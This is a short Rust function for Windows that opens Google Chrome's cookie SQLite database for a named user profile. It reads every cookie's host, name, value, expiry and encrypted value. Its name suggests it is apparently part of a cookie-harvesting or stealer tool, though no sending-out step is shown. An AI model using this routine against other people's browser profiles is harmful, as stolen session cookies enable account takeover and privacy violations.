use rusqlite::Connection;

#[cfg(windows)]
pub async fn take_cookies_from_db(
    username: String,
) -> Result<Vec<(String, String, String, i64, Vec<u8>)>, rusqlite::Error> {
    let conn = match Connection::open(format!(
        r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
        username
    )) {
        Ok(conn) => conn,
        Err(e) => return Err(e),
    };

    let query = "SELECT host_key, name, value, expires_utc, encrypted_value FROM cookies";

    let mut stmt = conn.prepare(&query).unwrap();

    let cookie_iter = stmt
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, String>(2)?,
                row.get::<_, i64>(3)?,
                row.get::<_, Vec<u8>>(4)?,
            ))
        })?
        .collect();

    cookie_iter
}
